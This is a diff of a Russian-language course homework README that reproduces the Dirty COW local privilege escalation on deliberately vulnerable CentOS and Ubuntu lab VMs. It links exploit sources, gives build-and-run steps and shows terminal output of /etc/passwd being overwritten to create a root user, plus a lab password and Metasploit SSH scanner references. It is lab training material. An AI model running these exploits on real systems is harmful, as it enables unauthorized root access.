@@ -5,13 +5,13 @@
 -----------------------------------------------
 
 1. Centos
-в vagrantfile плейбуками ansible 
+в vagrantfile плейбуками ansible:
 - поднимаем vm Centos 7 из образа с уязвимым ядром 3.10.0-327 (nodevictim, 192.168.99.101)
 - создаем на vm nodevictim пользователя otus с обычными правами и паролем vic!!vak
 - загружаем исходник эксплоита cowroot из [источника](https://gist.githubusercontent.com/joshuaskorich/86c90e12436c873e4a06bd64b461cc43/raw/71db45f5b97c8e4ed00f1193e578a77f90dabbdd/cowroot.c) в домашнюю папку пользователя otus
 - собираем эксплоит из исходника (output=dirty)
 - переводим selinux в permissive mode
-- заходим ssh под пользователем otus, запускаем эксплоит, убеждаемся, что у нас права рута (id)
+- заходим ssh под пользователем otus, запускаем эксплоит, убеждаемся, что у нас права рута (id), см [скриншот](https://github.com/drJabber/otus_is_2020_01/blob/master/hw03/screenshots/centos%20-%202020-02-24%2010-12-56.png)
 <code>
 
     djabber@xJabber:~/projects/otus/IS/hw03$ ssh -i ./ansible/nodebuntu/ssh/otus3_key otus@192.168.99.101
@@ -55,6 +55,59 @@
 </code>
 
 2. Ubuntu
+в vagrantfile плейбуками ansible:
+- поднимаем vm Ubuntu 16.04 из образа с уязвимым ядром 4.4.0-42 (nodebuntu, 192.168.99.102)
+- создаем на vm nodebuntu пользователя otus с обычными правами и паролем vic!!vak
+- загружаем исходник эксплоита cowroot из [источника](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c) в домашнюю папку пользователя otus
+- собираем эксплоит из исходника
+- переводим selinux в permissive mode
+- заходим ssh под пользователем otus, запускаем эксплоит, убеждаемся, что у нас права рута (su firefart, id), см [скриншот](https://github.com/drJabber/otus_is_2020_01/blob/master/hw03/screenshots/ubuntu%202020-02-24%2023-20-21.png)
+
+<code>
+
+    djabber@xJabber:~/projects/otus/IS/hw03$ ssh -i ./ansible/nodebuntu/ssh/otus3_key otus@192.168.99.102
+    Warning: Permanently added '192.168.99.102' (ECDSA) to the list of known hosts.
+    Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-42-generic x86_64)
+
+    * Documentation:  https://help.ubuntu.com
+
+    * Management:     https://landscape.canonical.com
+
+    * Support:        https://ubuntu.com/advantage
+
+    684 packages can be updated.
+    451 updates are security updates.
+
+    otus@nodebuntu:~$ ./dirty
+    /etc/passwd successfully backed up to /tmp/passwd.bak
+    Please enter the new password: 
+    Complete line:
+    firefart:fiRbwOlRgkx7g:0:0:pwned:/root:/bin/bash
+
+    mmap: 7f7247d3a000
+
+    madvise 0
+
+    ptrace 0
+    Done! Check /etc/passwd to see if the new user was created.
+    You can log in with the username 'firefart' and the password '123'.
+
+
+    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+    Done! Check /etc/passwd to see if the new user was created.
+    You can log in with the username 'firefart' and the password '123'.
+
+
+    DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
+    otus@nodebuntu:~$ 
+    otus@nodebuntu:~$ su firefart
+    Password: 
+    firefart@nodebuntu:/home/otus# 
+    firefart@nodebuntu:/home/otus# id
+    uid=0(firefart) gid=0(root) groups=0(root)
+</code>
+
+
 3. Metasploit
 - использовал материалы
 https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/
